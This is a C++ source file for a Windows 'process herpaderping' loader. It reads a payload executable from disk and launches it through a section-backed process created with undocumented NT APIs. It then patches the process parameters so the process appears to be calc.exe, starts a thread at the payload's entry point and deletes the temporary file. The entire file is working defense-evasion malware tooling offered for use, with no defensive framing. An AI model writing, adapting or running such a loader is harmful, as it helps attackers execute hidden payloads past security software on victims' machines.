#include <Windows.h>
#include <winternl.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")

#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

// NT API typedefs
using _NtCreateSection = NTSTATUS(WINAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
using _NtCreateProcessEx = NTSTATUS(WINAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, BOOLEAN);
using _NtQueryInformationProcess = NTSTATUS(WINAPI*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
using _NtCreateThreadEx = NTSTATUS(WINAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID);
using _NtAllocateVirtualMemory = NTSTATUS(WINAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
using _NtWriteVirtualMemory = NTSTATUS(WINAPI*)(HANDLE, PVOID, PVOID, ULONG, PULONG);
using _NtReadVirtualMemory = NTSTATUS(WINAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
using _RtlCreateProcessParametersEx = NTSTATUS(WINAPI*)(PRTL_USER_PROCESS_PARAMETERS*, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PVOID, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, ULONG);
using _RtlDestroyProcessParameters = VOID(WINAPI*)(PRTL_USER_PROCESS_PARAMETERS);
using _RtlImageNtHeader = PIMAGE_NT_HEADERS(WINAPI*)(PVOID);
using _RtlInitUnicodeString = VOID(WINAPI*)(PUNICODE_STRING, PCWSTR);

// Reads the payload from disk
BYTE* ReadPayload(OUT DWORD& size) {
    HANDLE hFile = CreateFileW(L"C:\\temp\\payload64.exe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::wcerr << L"[!] Failed to open payload file." << std::endl;
        return nullptr;
    }

    size = GetFileSize(hFile, NULL);
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        CloseHandle(hFile);
        return nullptr;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, size, &bytesRead, NULL) || bytesRead != size) {
        CloseHandle(hFile);
        VirtualFree(buffer, 0, MEM_RELEASE);
        return nullptr;
    }

    CloseHandle(hFile);
    return buffer;
}

// Calculates the entry point of the payload in the target process
ULONG_PTR CalcEntry(HANDLE hProcess, BYTE* localImage, PVOID remotePEB) {
    auto RtlImageNtHeader = (_RtlImageNtHeader)GetProcAddress(GetModuleHandleA("ntdll"), "RtlImageNtHeader");
    auto NtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtReadVirtualMemory");

    BYTE pebBuffer[0x1000] = {};
    SIZE_T bytesRead;
    if (!NT_SUCCESS(NtReadVirtualMemory(hProcess, remotePEB, pebBuffer, sizeof(pebBuffer), &bytesRead)))
        return 0;

    PVOID remoteImageBase = ((PPEB)pebBuffer)->ImageBaseAddress;
    ULONG entryRVA = RtlImageNtHeader(localImage)->OptionalHeader.AddressOfEntryPoint;
    return (ULONG_PTR)remoteImageBase + entryRVA;
}

// Main herpaderping logic
BOOL Herpaderping(BYTE* payload, DWORD size) {
    auto Load = [](LPCSTR name) -> FARPROC { return GetProcAddress(GetModuleHandleA("ntdll"), name); };

    auto NtCreateSection = (_NtCreateSection)Load("NtCreateSection");
    auto NtCreateProcessEx = (_NtCreateProcessEx)Load("NtCreateProcessEx");
    auto NtQueryInformationProcess = (_NtQueryInformationProcess)Load("NtQueryInformationProcess");
    auto NtCreateThreadEx = (_NtCreateThreadEx)Load("NtCreateThreadEx");
    auto NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)Load("NtAllocateVirtualMemory");
    auto NtWriteVirtualMemory = (_NtWriteVirtualMemory)Load("NtWriteVirtualMemory");
    auto NtReadVirtualMemory = (_NtReadVirtualMemory)Load("NtReadVirtualMemory");
    auto RtlImageNtHeader = (_RtlImageNtHeader)Load("RtlImageNtHeader");
    auto RtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)Load("RtlCreateProcessParametersEx");
    auto RtlDestroyProcessParameters = (_RtlDestroyProcessParameters)Load("RtlDestroyProcessParameters");
    auto RtlInitUnicodeString = (_RtlInitUnicodeString)Load("RtlInitUnicodeString");

    // Create a temporary file and write the payload
    WCHAR tmpPath[MAX_PATH], tmpFile[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpPath);
    GetTempFileNameW(tmpPath, L"hd", 0, tmpFile);

    HANDLE hTmp = CreateFileW(tmpFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
    if (hTmp == INVALID_HANDLE_VALUE) return FALSE;

    DWORD written;
    WriteFile(hTmp, payload, size, &written, NULL);

    // Create section from the file
    HANDLE hSection = NULL;
    if (!NT_SUCCESS(NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hTmp))) {
        CloseHandle(hTmp);
        return FALSE;
    }

    // Spawn a new process from the section
    HANDLE hProcess = NULL;
    if (!NT_SUCCESS(NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE))) {
        CloseHandle(hTmp);
        return FALSE;
    }

    // Query process information to get PEB
    PROCESS_BASIC_INFORMATION pbi;
    if (!NT_SUCCESS(NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL))) {
        CloseHandle(hTmp);
        return FALSE;
    }

    ULONG_PTR ep = CalcEntry(hProcess, payload, pbi.PebBaseAddress);
    if (!ep) {
        CloseHandle(hTmp);
        return FALSE;
    }

    // Create command line parameters for the new process
    UNICODE_STRING uPath, uDll;
    RtlInitUnicodeString(&uPath, L"C:\\Windows\\System32\\calc.exe");
    RtlInitUnicodeString(&uDll, L"C:\\Windows\\System32");

    PRTL_USER_PROCESS_PARAMETERS procParams = nullptr;
    if (!NT_SUCCESS(RtlCreateProcessParametersEx(&procParams, &uPath, &uDll, NULL, &uPath, NULL, NULL, NULL, NULL, NULL, 1))) {
        CloseHandle(hTmp);
        return FALSE;
    }

    // Allocate memory in the new process for parameters
    SIZE_T paramSize = procParams->EnvironmentSize + procParams->MaximumLength;
    PVOID remoteParams = procParams;
    if (!NT_SUCCESS(NtAllocateVirtualMemory(hProcess, &remoteParams, 0, &paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
        RtlDestroyProcessParameters(procParams);
        CloseHandle(hTmp);
        return FALSE;
    }

    if (!NT_SUCCESS(NtWriteVirtualMemory(hProcess, remoteParams, procParams, (ULONG)paramSize, NULL))) {
        RtlDestroyProcessParameters(procParams);
        CloseHandle(hTmp);
        return FALSE;
    }

    // Patch PEB->ProcessParameters
    NtWriteVirtualMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, ProcessParameters), &remoteParams, sizeof(PVOID), NULL);
    RtlDestroyProcessParameters(procParams);

    // Start thread at the payload entry point
    HANDLE hThread = NULL;
    if (!NT_SUCCESS(NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)ep, NULL, FALSE, 0, 0, 0, NULL))) {
        CloseHandle(hTmp);
        return FALSE;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    CloseHandle(hTmp);
    DeleteFileW(tmpFile);  // Clean up temporary file

    return TRUE;
}

int wmain() {
    DWORD size = 0;
    BYTE* buffer = ReadPayload(size);
    if (!buffer) {
        std::wcerr << L"[!] Failed to read payload." << std::endl;
        return -1;
    }

    if (!Herpaderping(buffer, size)) {
        std::wcerr << L"[!] Herpaderping failed." << std::endl;
        return -1;
    }

    std::wcout << L"[+] Payload executed successfully!" << std::endl;
    return 0;
}
